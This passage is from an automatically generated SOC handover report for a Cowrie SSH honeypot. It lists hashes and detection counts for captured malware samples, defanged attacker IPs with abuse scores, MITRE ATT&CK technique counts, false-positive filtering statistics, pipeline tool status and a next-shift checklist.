| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `204.76.203[.]225` | NL | Intelligence Hosting LLC | **100** ⚠️ | 29 |
| `82.197.58[.]130` | SA | Mobile Telecommunication Company Saudi Arabia Joint-Stock company | **100** ⚠️ | 1 |
| `223.123.124[.]104` | PK | CMPak Limited | **100** ⚠️ | 1 |
| `151.95.83[.]235` | IT | Iunet-bnet-195 | **100** ⚠️ | 7 |
| `131.0.226[.]61` | BR | Defensoria Pública de Pernambuco | **100** ⚠️ | 24 |
| `66.132.172[.]178` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `3.91.176[.]195` | US | Amazon Data Services Northern Virginia | **100** ⚠️ | 38 |
| `61.92.58[.]210` | HK | Hong Kong Broadband Network Ltd | **100** ⚠️ | 50 |
| `196.196.150[.]5` | ES | SA | **100** ⚠️ | 1 |
| `185.117.103[.]121` | UA | CRELCOM LLC | **100** ⚠️ | 3 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 100 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 71 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 26 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 12 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 12 |

---

## 🔕 False Positive Summary (32 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 15 below threshold 25 | 6 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 12 |
| AbuseIPDB score 8 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 7 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 164 cases |
| Tool 34  | Credential Extractor        | ✅ 97 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 41 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 32 filtered (19.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 37 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 26 priority case(s) shown individually · 28 recon entry/entries in table (13 group(s) consolidating 91 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-21T16:41:40Z_
